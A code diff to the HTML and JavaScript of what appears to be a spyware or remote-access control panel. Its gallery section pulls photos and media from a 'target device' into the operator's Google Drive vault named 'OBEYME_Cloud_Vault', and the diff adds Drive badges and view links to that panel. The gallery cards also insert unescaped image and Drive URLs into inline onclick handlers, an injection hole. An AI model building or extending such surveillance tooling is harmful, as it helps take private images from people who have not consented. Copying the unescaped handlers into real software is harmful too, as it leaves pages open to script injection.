@@ -339,11 +339,16 @@
                     <!-- Gallery Control Header -->
                     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 14px;">
                         <div>
-                            <h4 style="font-size: 1.1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
-                                <i class="fas fa-images text-primary-c"></i> Media Gallery & Cloud Photo Vault
-                            </h4>
+                            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
+                                <h4 style="font-size: 1.1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; margin: 0;">
+                                    <i class="fas fa-images text-primary-c"></i> Media Gallery & Cloud Photo Vault
+                                </h4>
+                                <span class="live-badge" style="background: rgba(48, 209, 88, 0.12); border: 1px solid rgba(48, 209, 88, 0.35); color: #30d158; padding: 3px 10px; font-size: 0.7rem; border-radius: var(--radius-pill);">
+                                    <i class="fab fa-google-drive" style="margin-right: 4px;"></i> Google Drive Vault
+                                </span>
+                            </div>
                             <p style="font-size: 0.78rem; color: var(--text-secondary); margin: 0;">
-                                Cloud synced photos & videos from target device storage.
+                                High-res synced photos & media directly stored in your Google Drive (<code style="color: #ff453a; font-size: 0.72rem;">OBEYME_Cloud_Vault</code>).
                             </p>
                         </div>
                         
@@ -371,7 +376,7 @@
 
                     <!-- Sync Status Bar -->
                     <div id="gallerySyncStatus" style="display: none; background: rgba(255, 59, 48, 0.08); border: 1px solid rgba(255, 59, 48, 0.25); border-radius: 12px; padding: 10px 16px; margin-bottom: 20px; font-size: 0.8rem; color: #fff; align-items: center; justify-content: space-between;">
-                        <span id="gallerySyncMsg"><i class="fas fa-spinner fa-spin" style="color: var(--primary); margin-right: 8px;"></i> Syncing photos from device...</span>
+                        <span id="gallerySyncMsg"><i class="fas fa-spinner fa-spin" style="color: var(--primary); margin-right: 8px;"></i> Syncing photos to Google Drive...</span>
                         <span id="gallerySyncTime" style="font-size: 0.72rem; color: var(--text-muted);">Just now</span>
                     </div>
 
@@ -385,7 +390,7 @@
                         <div id="recentGalleryGrid" class="gallery-grid">
                             <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
                                 <i class="fas fa-images"></i>
-                                <p>No recent photos loaded. Click <b>'🔄 Fetch Gallery Photos'</b> above to sync latest captures.</p>
+                                <p>No recent photos loaded. Click <b>'🔄 Fetch Gallery Photos'</b> above to sync latest captures to Google Drive.</p>
                             </div>
                         </div>
                     </div>
@@ -394,13 +399,13 @@
                     <div>
                         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 8px; border-bottom: 1px solid var(--border-subtle);">
                             <h5 style="font-size: 0.92rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0;">
-                                <i class="fas fa-archive text-primary-c"></i> All Gallery Photos (Master Cloud Vault) <span id="allCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
+                                <i class="fas fa-archive text-primary-c"></i> All Gallery Photos (Master Google Drive Vault) <span id="allCountBadge" class="badge-count" style="font-size: 0.65rem;">0</span>
                             </h5>
                         </div>
                         <div id="allGalleryGrid" class="gallery-grid">
                             <div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;">
                                 <i class="fas fa-photo-video"></i>
-                                <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to perform a full storage scan.</p>
+                                <p>No archived media found. Click <b>'🔄 Fetch ALL Gallery Photos'</b> to sync entire device library to Google Drive.</p>
                             </div>
                         </div>
                     </div>
@@ -443,14 +448,19 @@
                 <i class="fas fa-times"></i>
             </button>
             <img id="lightboxImg" src="" alt="Preview" style="max-width: 85vw; max-height: 75vh; border-radius: 14px; object-fit: contain; box-shadow: 0 10px 40px rgba(0,0,0,0.9); border: 1px solid rgba(255,255,255,0.15);">
-            <div style="margin-top: 14px; display: flex; align-items: center; justify-content: space-between; width: 100%; max-width: 600px; background: rgba(18,14,16,0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); padding: 10px 18px; border-radius: 30px; border: 1px solid var(--border);">
-                <div style="display: flex; flex-direction: column; overflow: hidden; margin-right: 12px;">
+            <div style="margin-top: 14px; display: flex; align-items: center; justify-content: space-between; width: 100%; max-width: 600px; background: rgba(18,14,16,0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); padding: 10px 18px; border-radius: 30px; border: 1px solid var(--border); gap: 10px; flex-wrap: wrap;">
+                <div style="display: flex; flex-direction: column; overflow: hidden; margin-right: 8px; flex: 1; min-width: 150px;">
                     <span id="lightboxName" style="font-size: 0.85rem; font-weight: 700; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">Photo</span>
                     <span id="lightboxMeta" style="font-size: 0.7rem; color: var(--text-muted);">Timestamp</span>
                 </div>
-                <a id="lightboxDlBtn" href="" download="photo.jpg" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; white-space: nowrap;">
-                    <i class="fas fa-download me-1"></i> Save to PC
-                </a>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <a id="lightboxDriveBtn" href="" target="_blank" class="btn-ghost" style="padding: 6px 14px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; display: none; background: rgba(48, 209, 88, 0.15); border-color: rgba(48, 209, 88, 0.4); color: #30d158;">
+                        <i class="fab fa-google-drive me-1"></i> Drive View
+                    </a>
+                    <a id="lightboxDlBtn" href="" download="photo.jpg" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.75rem; border-radius: var(--radius-pill); text-decoration: none; white-space: nowrap;">
+                        <i class="fas fa-download me-1"></i> Save to PC
+                    </a>
+                </div>
             </div>
         </div>
     </div>
@@ -1137,12 +1147,13 @@
         }
     }
 
-    function openLightbox(src, name, meta) {
+    function openLightbox(src, name, meta, driveUrl) {
         const modal = document.getElementById('galleryLightboxModal');
         const img = document.getElementById('lightboxImg');
         const nameEl = document.getElementById('lightboxName');
         const metaEl = document.getElementById('lightboxMeta');
         const dlBtn = document.getElementById('lightboxDlBtn');
+        const driveBtn = document.getElementById('lightboxDriveBtn');
 
         if (img) img.src = src;
         if (nameEl) nameEl.textContent = name || 'Photo Preview';
@@ -1150,6 +1161,14 @@
         if (dlBtn) {
             dlBtn.href = src;
             dlBtn.download = name || 'downloaded_photo.jpg';
+        }
+        if (driveBtn) {
+            if (driveUrl) {
+                driveBtn.href = driveUrl;
+                driveBtn.style.display = 'inline-flex';
+            } else {
+                driveBtn.style.display = 'none';
+            }
         }
         if (modal) modal.style.display = 'flex';
     }
@@ -1177,15 +1196,18 @@
 
         let html = '';
         items.forEach((item, index) => {
-            const src = item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const src = item.directUrl || item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const driveUrl = item.driveUrl || '';
             const name = item.name || `Recent_Photo_${index + 1}.jpg`;
             const date = item.time ? new Date(item.time).toLocaleDateString() : '';
             const size = item.size ? (item.size > 1048576 ? (item.size / 1048576).toFixed(1) + ' MB' : (item.size / 1024).toFixed(0) + ' KB') : '';
 
             if (src) {
+                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>` : '';
                 html += `
-                <div class="gallery-card" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}')">
+                <div class="gallery-card" style="position:relative;" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}', '${driveUrl}')">
                     <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
+                    ${driveBadge}
                     <div class="gallery-card-overlay">
                         <span class="gallery-card-name">${escapeHtml(name)}</span>
                         <div class="gallery-card-meta">
@@ -1206,7 +1228,7 @@
         if (!container) return;
 
         if (!data) {
-            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-photo-video"></i><p>No archived media found. Click <b>\'🔄 Fetch ALL Gallery Photos\'</b> to sync entire device library.</p></div>';
+            container.innerHTML = '<div class="empty-state" style="grid-column: 1 / -1; padding: 30px 10px;"><i class="fas fa-photo-video"></i><p>No archived media found. Click <b>\'🔄 Fetch ALL Gallery Photos\'</b> to sync entire device library to Google Drive.</p></div>';
             if (badge) badge.textContent = '0';
             return;
         }
@@ -1216,15 +1238,18 @@
 
         let html = '';
         items.forEach((item, index) => {
-            const src = item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const src = item.directUrl || item.url || (item.base64 ? (item.base64.startsWith('data:') ? item.base64 : 'data:image/jpeg;base64,' + item.base64) : '');
+            const driveUrl = item.driveUrl || '';
             const name = item.name || `Gallery_${index + 1}.jpg`;
             const date = item.time ? new Date(item.time).toLocaleDateString() : '';
             const size = item.size ? (item.size > 1048576 ? (item.size / 1048576).toFixed(1) + ' MB' : (item.size / 1024).toFixed(0) + ' KB') : '';
 
             if (src) {
+                const driveBadge = driveUrl ? `<span style="position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);color:#30d158;font-size:0.65rem;padding:2px 8px;border-radius:10px;border:1px solid rgba(48,209,88,0.4);font-weight:600;"><i class="fab fa-google-drive"></i> Drive</span>` : '';
                 html += `
-                <div class="gallery-card" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}')">
+                <div class="gallery-card" style="position:relative;" onclick="openLightbox('${src}', '${escapeHtml(name)}', '${date} ${size}', '${driveUrl}')">
                     <img src="${src}" alt="${escapeHtml(name)}" loading="lazy">
+                    ${driveBadge}
                     <div class="gallery-card-overlay">
                         <span class="gallery-card-name">${escapeHtml(name)}</span>
                         <div class="gallery-card-meta">
